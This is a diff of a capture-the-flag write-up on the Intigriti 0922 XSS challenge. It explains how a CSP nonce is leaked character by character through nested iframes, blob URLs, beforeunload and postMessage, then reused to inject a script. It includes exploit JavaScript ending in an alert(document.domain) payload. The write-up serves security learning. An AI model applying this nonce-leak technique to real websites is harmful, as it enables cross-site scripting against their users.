+  Only integers can be used to set `width`, `height`.
 
-One trick that works tough is to change the `src` attribute to something that is 
-allowed by the CSP and away from the current blob URL. And that is just only
-`https://challenge-0922.intigriti.io`. Inside our blobbed URL script we will listen
-for the `beforeunload` event. It's one of the last events a website generates
-before it's moved away from.
+  Change the `src` of the `iframe`. Listen inside to `onbeforeuload` event.
+  This will destroy the `iframe` though because it's being redirected somewhere
+  else. But a few commands should be able to run before the code itself vanishes.
+
+After a lot of experimenting we will come to the conclusion that the `name` method
+works but only in firefox. The `hash` and `resize` trick don't seem to work in any browser
+in this particular case. And we are left with unloading the `iframe`. We can only
+change it's `src` to `https://challenge-0922.intigriti.io`. The only thing
+allowed by the CSP except `blob:`.
 
 The unloading of the `iframe` complicates things further as we will not be able
 to keep a state of the soft "bruteforced" nonce inside of it. Because it will
@@ -790,10 +806,7 @@ In order to store the 'nonce' somewhere else we will send it away. We will
 `postMessage` it ouf of the `iframe` to the `top`. This is the code that changed
 the location of the iframe in the iframe.
 
-Then we will start the process again by switchting the most inner frame to a
-blob URL with the just recovered nonce. This nonce will be used as starting point.
-
-Here a graphical overview of the iframes when everything starts.
+Here a graphical overview of the process. First the state when everything starts.
 ```
 editor.43z.one/1337
 +------------------------------------------------------------+
@@ -810,7 +823,6 @@ editor.43z.one/1337
 ```
 Then from `editor.43z.one/1337` we will change the most inner frame
 to a blob with our code in it.
-
 ```
                                                            change to blob
                                                                 +
@@ -848,7 +860,7 @@ The blob code starts working.
 +---------------------------------------------------------------------+
 ```
 On every message `index.php` receives it does the `document.querySelector`
-call wich includes the sent nonce. 
+call which includes the sent nonce.
 ```
   editor.43z.one/1337
 +----------------------------------------------------------------------------------------+
@@ -874,25 +886,25 @@ call wich includes the sent nonce.
 +----------------------------------------------------------------------------------------+
 ```
 The top has now the first character of the nonce. And the whole process
-is starts again. But this time the blob code starts iteration from with the new
+starts again. But this time the blob code starts the iteration from with the new
 nonce that just matched.
 
 We will do this again and again and build up the nonce character by character.
 It's tricky to detect the when we got the full nonce because it has not a fixed
 length. It can be from 29 up to 32 characters long. We will have to make use
-of some timeout counter and simply define that if we don't get a messsage in the
+of some timeout counter and simply define that if we don't get a message in the
 `top` from the blob in 2 seconds it means we already have the full nonce.
 
-And when that happens we can finally do what failed before. Create a new blob
-one last time that sends the 'set' message which changes the 'srcdoc' of the iframe.
+And when that happens we can finally do what failed before. Create a new blob,
+one last time, that sends the 'set' message which changes the 'srcdoc' of the iframe.
 But this time we got the nonce to make the Content Security Policy happy.
 
 ```
-<iframe onload=stage1() id=i src="https://challenge-0922.intigriti.io/challenge/"></iframe>
+<iframe onload=stage1() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
 <script>
   onmessage = e => {
     // here detecting the progress of the nonce
-    if(nonce fully exfiltrated){
+    if(nonce fully extracted){
       stage2(nonce)
     }
   }
@@ -909,9 +921,10 @@ But this time we got the nonce to make the Content Security Policy happy.
           attr: 'srcdoc',
           // we have to use parent.alert because iframe 
           // has sandbox value set and does not allow modals
+          // alternatively we could make use of `removeAttribute` to delete it
           value: '<script nonce=${nonce}>parent.alert(document.domain)</'+'script>'
         }, '*') 
-      <`+`/script>
+      <\/script>
     `], {type : 'text/html'}))
     frames[0][0].location = burl 
   }
@@ -990,3 +1003,6 @@ And here is the final exploit with all the glue code added to make it actually w
   }
 </script>
 ```
+
+This was a long journey! You can shoot me a message [@h43z](https://twitter.com/h43z) or open a PR if 
+you have any questions.
